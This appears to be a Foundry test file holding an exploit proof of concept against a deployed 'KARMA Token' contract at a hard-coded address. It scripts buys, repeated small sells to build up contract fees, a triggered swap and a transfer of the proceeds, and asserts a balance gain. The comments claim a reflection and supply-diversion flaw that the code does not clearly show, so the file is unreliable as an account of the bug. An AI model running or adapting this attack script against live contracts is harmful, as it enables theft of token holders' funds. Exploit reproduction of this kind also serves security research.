contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x8F9bA08Cbf014aB233A33067B21bEdF3876c6605;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll work with the deployed contract
        // Just ensure we have BNB to start
        vm.deal(attacker, 10 ether);

        // Label addresses for clarity
        vm.label(TARGET, "KARMA Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get contract references
        IKARMA token = IKARMA(TARGET);
        IUniswapV2Router02 router = IUniswapV2Router02(token.uniswapV2Router());

        // Calculate max transaction amounts (1.5% of total supply)
        // total supply = 1e9 * 10^9 = 1e18 tokens (with 9 decimals)
        // maxTransactionAmount = 1e18 * 15 / 1000 = 15e15 = 15,000,000 * 10^9
        uint256 maxTxAmount = 15_000_000 * 10**9; // 15 million tokens

        console.log("Max transaction amount:", maxTxAmount);

        // Step 2: Buy tokens below max limit
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        // Buy a small amount to start
        uint256 buyAmountETH = 0.1 ether;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyAmountETH}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Record initial balance
        uint256 initialBalance = token.balanceOf(attacker);
        console.log("Initial balance:", initialBalance);

        // Check swap threshold
        uint256 swapThreshold = token.swapTokensAtAmount();
        console.log("Swap threshold:", swapThreshold);

        // Step 3: Accumulate fees by making small trades
        // We'll make multiple small trades to avoid hitting max transaction limits
        path[0] = TARGET;
        path[1] = router.WETH();

        uint256 contractBalance = token.balanceOf(TARGET);
        console.log("Initial contract balance:", contractBalance);

        // Make several small trades to accumulate fees
        for (uint256 i = 0; i < 5 && contractBalance < swapThreshold; i++) {
            // Check our current balance
            uint256 currentBalance = token.balanceOf(attacker);

            // Sell a small amount (well below maxTxAmount)
            uint256 sellAmount = currentBalance / 10; // Sell 10% of our balance
            if (sellAmount > maxTxAmount) {
                sellAmount = maxTxAmount / 2;
            }

            if (sellAmount == 0) {
                // Need to buy more tokens
                path[0] = router.WETH();
                path[1] = TARGET;

                router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.05 ether}(
                    0,
                    path,
                    attacker,
                    block.timestamp
                );
                continue;
            }

            // Approve and sell
            token.approve(address(router), sellAmount);

            path[0] = TARGET;
            path[1] = router.WETH();

            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                sellAmount,
                0,
                path,
                attacker,
                block.timestamp
            );

            // Update contract balance
            contractBalance = token.balanceOf(TARGET);
            console.log("Contract balance after trade", i + 1, ":", contractBalance);

            // Small delay between trades
            vm.roll(block.number + 1);
        }

        console.log("Final contract balance:", contractBalance);
        console.log("Swap threshold:", swapThreshold);

        // Step 4: If contract has enough fees, trigger swap by selling more
        if (contractBalance >= swapThreshold) {
            // Sell a small amount to trigger the swap mechanism
            uint256 triggerAmount = token.balanceOf(attacker) / 20; // 5% of balance
            if (triggerAmount > maxTxAmount) {
                triggerAmount = maxTxAmount / 2;
            }

            if (triggerAmount > 0) {
                token.approve(address(router), triggerAmount);

                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    triggerAmount,
                    0,
                    path,
                    attacker,
                    block.timestamp
                );

                console.log("Triggered swap with amount:", triggerAmount);
            }
        }

        // Step 5: Check final balance
        uint256 finalBalance = token.balanceOf(attacker);
        console.log("Final balance:", finalBalance);

        // Transfer to another address to realize value
        address recipient = address(0x123);
        if (finalBalance > 0) {
            token.transfer(recipient, finalBalance);
        }

        uint256 recipientBalance = token.balanceOf(recipient);
        console.log("Recipient balance:", recipientBalance);

        // Verify the exploit worked - our balance should have increased
        // due to the reflection rate change after burns
        assertGt(recipientBalance, initialBalance, "Balance should have increased due to total supply diversion");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
